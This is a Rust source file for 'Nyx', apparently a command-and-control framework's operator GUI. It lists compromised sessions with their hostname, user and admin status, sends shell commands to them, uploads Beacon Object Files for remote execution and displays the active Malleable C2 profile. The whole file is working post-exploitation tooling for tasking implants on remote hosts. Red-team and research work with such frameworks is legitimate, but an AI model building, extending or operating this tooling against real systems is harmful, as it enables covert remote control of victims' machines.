//! Nyx operator GUI — a pure-Rust **egui** desktop client. No Node/JS/HTML: a
//! single Rust binary that talks to the team server's REST API (same surface as
//! `nyx-cli`). Left panel = live sessions; centre = tabbed console (shell),
//! BOF runner, and profile view.
//!
//! Run: `NYX_SERVER=http://127.0.0.1:8443 cargo run -p nyx-client`

use std::sync::mpsc::{self, Receiver, Sender};
use std::time::Duration;

use eframe::egui;
use serde::Deserialize;

#[derive(Debug, Clone, Deserialize)]
struct SessionView {
    id: String,
    hostname: String,
    username: String,
    os: String,
    is_admin: u8,
    pending: usize,
    #[allow(dead_code)]
    beacon_id: u32,
    #[allow(dead_code)]
    arch: u8,
    #[allow(dead_code)]
    pid: u32,
}

#[derive(Debug, Clone, Deserialize)]
struct ProfileView {
    loaded: bool,
    http_get_uri: Option<String>,
    http_post_uri: Option<String>,
    useragent: Option<String>,
}

#[derive(Debug, Deserialize)]
struct TaskAck {
    task_id: u64,
}
#[derive(Debug, Deserialize)]
struct ResultView {
    task_id: u64,
    kind: String,
    text: String,
}

enum Msg {
    Sessions(Vec<SessionView>),
    Line(String),
    Profile(ProfileView),
}

#[derive(PartialEq)]
enum Tab {
    Console,
    Bof,
    Profile,
}

struct App {
    server: String,
    sessions: Vec<SessionView>,
    selected: Option<String>,
    rx: Receiver<Msg>,
    tx: Sender<Msg>,
    shell_input: String,
    bof_path: String,
    log: Vec<String>,
    tab: Tab,
    profile: Option<ProfileView>,
}

impl App {
    fn new(cc: &eframe::CreationContext<'_>) -> Self {
        let (tx, rx) = mpsc::channel();
        let server =
            std::env::var("NYX_SERVER").unwrap_or_else(|_| "http://127.0.0.1:8443".to_string());

        let (srv, tx2, ctx) = (server.clone(), tx.clone(), cc.egui_ctx.clone());
        std::thread::spawn(move || loop {
            if let Ok(list) = fetch_sessions(&srv) {
                let _ = tx2.send(Msg::Sessions(list));
            }
            ctx.request_repaint();
            std::thread::sleep(Duration::from_secs(1));
        });

        Self {
            server,
            sessions: Vec::new(),
            selected: None,
            rx,
            tx,
            shell_input: String::new(),
            bof_path: String::new(),
            log: vec!["Nyx client ready. Select a session, then run commands.".into()],
            tab: Tab::Console,
            profile: None,
        }
    }

    fn run_shell(&mut self, ctx: &egui::Context) {
        let cmd = self.shell_input.trim().to_string();
        if cmd.is_empty() {
            return;
        }
        let Some(sid) = self.selected.clone() else {
            self.log.push("! select a session first".into());
            return;
        };
        self.shell_input.clear();
        self.log.push(format!("$ {cmd}"));
        self.task_on_thread(ctx, move |srv, tx| match enqueue_shell(&srv, &sid, &cmd) {
            Ok(tid) => match poll_result(&srv, &sid, tid) {
                Ok(Some(o)) => tx_line(tx, o),
                Ok(None) => tx_line(tx, "[no output within timeout]".into()),
                Err(e) => tx_line(tx, format!("! {e}")),
            },
            Err(e) => tx_line(tx, format!("! {e}")),
        });
    }

    fn run_bof(&mut self, ctx: &egui::Context) {
        let path = self.bof_path.trim().to_string();
        let Some(sid) = self.selected.clone() else {
            self.log.push("! select a session first".into());
            return;
        };
        let name = std::path::Path::new(&path)
            .file_name()
            .and_then(|s| s.to_str())
            .unwrap_or("bof")
            .to_string();
        self.log.push(format!("[bof] {name}"));
        self.task_on_thread(ctx, move |srv, tx| match enqueue_bof(&srv, &sid, &path, &name) {
            Ok(tid) => match poll_result(&srv, &sid, tid) {
                Ok(Some(o)) => tx_line(tx, if o.is_empty() { "[bof ran (no output)]".into() } else { o }),
                Ok(None) => tx_line(tx, "[bof: no result]".into()),
                Err(e) => tx_line(tx, format!("! {e}")),
            },
            Err(e) => tx_line(tx, format!("! {e}")),
        });
    }

    fn refresh_profile(&mut self, ctx: &egui::Context) {
        let (srv, tx, ctx) = (self.server.clone(), self.tx.clone(), ctx.clone());
        std::thread::spawn(move || match fetch_profile(&srv) {
            Ok(p) => {
                let _ = tx.send(Msg::Profile(p));
            }
            Err(e) => tx_line(tx, format!("profile: ! {e}")),
        });
        ctx.request_repaint();
    }

    /// Run `work` on a background thread; it pushes lines back via the channel.
    fn task_on_thread(
        &self,
        ctx: &egui::Context,
        work: impl FnOnce(String, Sender<Msg>) + Send + 'static,
    ) {
        let (srv, tx, ctx) = (self.server.clone(), self.tx.clone(), ctx.clone());
        std::thread::spawn(move || {
            work(srv, tx);
            ctx.request_repaint();
        });
    }
}

fn tx_line(tx: Sender<Msg>, line: String) {
    let _ = tx.send(Msg::Line(line));
}

impl eframe::App for App {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        while let Ok(msg) = self.rx.try_recv() {
            match msg {
                Msg::Sessions(s) => {
                    if let Some(id) = &self.selected {
                        if !s.iter().any(|x| &x.id == id) {
                            self.selected = None;
                        }
                    }
                    self.sessions = s;
                }
                Msg::Line(l) => self.log.push(l),
                Msg::Profile(p) => self.profile = Some(p),
            }
        }

        egui::SidePanel::left("sessions")
            .resizable(true)
            .default_width(340.0)
            .show(ctx, |ui| {
                ui.heading(format!("Sessions ({})", self.sessions.len()));
                ui.label(format!("server: {}", self.server));
                ui.separator();
                for s in &self.sessions {
                    let selected = self.selected.as_deref() == Some(s.id.as_str());
                    let label = format!(
                        "{}\\{}  {}  {}{}  [{}…]",
                        s.hostname,
                        s.username,
                        s.os,
                        if s.is_admin == 1 { "admin " } else { "" },
                        if s.pending > 0 { format!("p:{} ", s.pending) } else { String::new() },
                        &s.id[..8.min(s.id.len())]
                    );
                    if ui.selectable_label(selected, label).clicked() {
                        self.selected = Some(s.id.clone());
                    }
                }
            });

        egui::CentralPanel::default().show(ctx, |ui| {
            ui.horizontal(|ui| {
                for (tab, label) in [
                    (Tab::Console, "Console"),
                    (Tab::Bof, "BOF"),
                    (Tab::Profile, "Profile"),
                ] {
                    if ui.selectable_label(self.tab == tab, label).clicked() {
                        self.tab = tab;
                    }
                }
            });
            ui.separator();

            match self.tab {
                Tab::Console => console_tab(ui, self, ctx),
                Tab::Bof => bof_tab(ui, self, ctx),
                Tab::Profile => profile_tab(ui, self, ctx),
            }
        });
    }
}

fn console_tab(ui: &mut egui::Ui, app: &mut App, ctx: &egui::Context) {
    ui.horizontal(|ui| {
        ui.heading("Console");
        ui.label(
            app.selected
                .as_ref()
                .map(|s| format!("({})", &s[..8.min(s.len())]))
                .unwrap_or_default(),
        );
    });
    ui.separator();
    egui::ScrollArea::vertical()
        .stick_to_bottom(true)
        .show(ui, |ui| {
            for line in &app.log {
                ui.label(line);
            }
        });
    ui.separator();
    ui.horizontal(|ui| {
        ui.label("nyx>");
        let resp = ui.text_edit_singleline(&mut app.shell_input);
        let enter = resp.lost_focus() && ui.input(|i| i.key_pressed(egui::Key::Enter));
        if ui.button("Run").clicked() || enter {
            app.run_shell(ctx);
        }
    });
}

fn bof_tab(ui: &mut egui::Ui, app: &mut App, ctx: &egui::Context) {
    ui.heading("BOF runner");
    ui.label("Path to a COFF/BOF object (.o) on the operator host:");
    ui.horizontal(|ui| {
        ui.text_edit_singleline(&mut app.bof_path);
        if ui.button("Run BOF").clicked() {
            app.run_bof(ctx);
        }
    });
    ui.separator();
    ui.label("(output appears in the Console log)");
}

fn profile_tab(ui: &mut egui::Ui, app: &mut App, ctx: &egui::Context) {
    ui.heading("Active Malleable C2 profile");
    if ui.button("Refresh").clicked() {
        app.refresh_profile(ctx);
    }
    ui.separator();
    match &app.profile {
        None => {
            ui.label("(not loaded — click Refresh)");
        }
        Some(p) => {
            ui.label(format!("loaded: {}", p.loaded));
            ui.label(format!("http-get uri : {}", p.http_get_uri.clone().unwrap_or_default()));
            ui.label(format!("http-post uri: {}", p.http_post_uri.clone().unwrap_or_default()));
            ui.label(format!("useragent    : {}", p.useragent.clone().unwrap_or_default()));
        }
    };
}

// ---- REST (ureq, on background threads) ------------------------------------

fn fetch_sessions(server: &str) -> anyhow::Result<Vec<SessionView>> {
    Ok(ureq::get(&format!("{server}/api/sessions")).call()?.into_json()?)
}

fn fetch_profile(server: &str) -> anyhow::Result<ProfileView> {
    Ok(ureq::get(&format!("{server}/api/profile")).call()?.into_json()?)
}

fn enqueue_shell(server: &str, session: &str, args: &str) -> anyhow::Result<u64> {
    let body = serde_json::json!({ "session": session, "command": { "type": "shell", "args": args } });
    let ack: TaskAck = ureq::post(&format!("{server}/api/task"))
        .send_json(body)?
        .into_json()?;
    Ok(ack.task_id)
}

fn enqueue_bof(server: &str, session: &str, file: &str, name: &str) -> anyhow::Result<u64> {
    let data = std::fs::read(file).map_err(|e| anyhow::anyhow!("read {file}: {e}"))?;
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "bof", "name": name, "args": [], "data_hex": hex::encode(&data) },
    });
    let ack: TaskAck = ureq::post(&format!("{server}/api/task"))
        .send_json(body)?
        .into_json()?;
    Ok(ack.task_id)
}

fn poll_result(server: &str, session: &str, task_id: u64) -> anyhow::Result<Option<String>> {
    let deadline = std::time::Instant::now() + Duration::from_secs(12);
    loop {
        let rs: Vec<ResultView> = ureq::get(&format!("{server}/api/results"))
            .query("session", session)
            .call()?
            .into_json()?;
        if let Some(r) = rs.into_iter().find(|r| r.task_id == task_id) {
            return Ok(Some(match r.kind.as_str() {
                "output" => r.text,
                "ok" => String::new(),
                "error" => format!("[error] {}", r.text),
                other => format!("[{other}] {}", r.text),
            }));
        }
        if std::time::Instant::now() >= deadline {
            return Ok(None);
        }
        std::thread::sleep(Duration::from_millis(250));
    }
}

fn main() -> eframe::Result<()> {
    let opts = eframe::NativeOptions::default();
    eframe::run_native("Nyx", opts, Box::new(|cc| Ok(Box::new(App::new(cc)))))
}
